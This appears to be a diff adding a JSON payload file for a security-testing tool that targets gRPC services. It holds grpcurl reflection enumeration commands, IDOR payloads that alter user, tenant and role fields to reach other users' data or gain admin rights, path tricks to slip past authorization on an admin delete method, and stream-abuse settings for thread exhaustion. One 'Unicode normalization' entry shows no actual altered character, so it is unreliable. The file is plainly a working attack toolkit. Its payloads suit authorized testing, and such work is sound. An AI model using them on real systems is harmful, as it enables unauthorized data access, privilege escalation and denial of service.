@@ -1,0 +1,39 @@
+{
+  "category": "grpc",
+  "contexts": {
+    "reflection_enum": {
+      "description": "Enumerate gRPC services and methods via server reflection",
+      "payloads": [
+        {"payload": "grpcurl -plaintext TARGET:PORT list", "description": "List all registered gRPC services via ServerReflection", "waf_bypass": false},
+        {"payload": "grpcurl -plaintext TARGET:PORT describe SERVICE_NAME", "description": "Describe service methods and message types", "waf_bypass": false},
+        {"payload": "grpcurl -plaintext TARGET:PORT describe .FULL_SYMBOL_NAME", "description": "Describe specific symbol (message type or enum) for field discovery", "waf_bypass": false},
+        {"payload": "grpcurl -plaintext -protoset-out /tmp/service.protoset TARGET:PORT describe", "description": "Dump full proto file descriptor set for offline analysis", "waf_bypass": false}
+      ]
+    },
+    "idor_field_manipulation": {
+      "description": "Manipulate protobuf fields to access unauthorized resources",
+      "payloads": [
+        {"payload": "{\"user_id\": ORIGINAL_ID+1}", "description": "Increment user_id field to access adjacent user's data", "waf_bypass": false},
+        {"payload": "{\"tenant_id\": \"OTHER_TENANT_UUID\", \"resource_id\": \"TARGET_RESOURCE\"}", "description": "Swap tenant_id to access cross-tenant resources", "waf_bypass": false},
+        {"payload": "{\"role\": 1, \"_original_role\": 0}", "description": "Modify role enum field (0=user, 1=admin) in protobuf message", "waf_bypass": false},
+        {"payload": "{\"org_id\": \"other-org-id\", \"user_id\": \"self\", \"action\": \"ListMembers\"}", "description": "Access another organization's resource list with own user credentials", "waf_bypass": false}
+      ]
+    },
+    "path_canonicalization": {
+      "description": "Bypass gRPC path-based authorization via canonicalization issues",
+      "payloads": [
+        {"payload": "/service.AdminService/DeleteUser/", "description": "Trailing slash to bypass exact path match on gRPC method", "waf_bypass": true},
+        {"payload": "/service.AdminService/../service.AdminService/DeleteUser", "description": "Double-dot traversal in gRPC service path", "waf_bypass": true},
+        {"payload": "/service.AdminService/DeleteUser", "description": "Unicode normalization — Latin capital S vs decomposed form in service name", "waf_bypass": true}
+      ]
+    },
+    "thread_leak": {
+      "description": "Resource exhaustion via gRPC stream abuse",
+      "payloads": [
+        {"payload": "{\"concurrent_streams\": 1000, \"method\": \"ServerStreaming\", \"close\": false}", "description": "Open many concurrent server-streaming RPCs without consuming responses", "waf_bypass": false},
+        {"payload": "{\"method\": \"UnaryCall\", \"deadline\": \"999999s\", \"concurrent\": 500}", "description": "Long-deadline unary calls to exhaust server thread pool", "waf_bypass": false},
+        {"payload": "{\"method\": \"BidiStreaming\", \"send_interval_ms\": 30000, \"close\": false, \"count\": 200}", "description": "Open bidirectional streams with slow sends and never close — holds server resources", "waf_bypass": false}
+      ]
+    }
+  }
+}
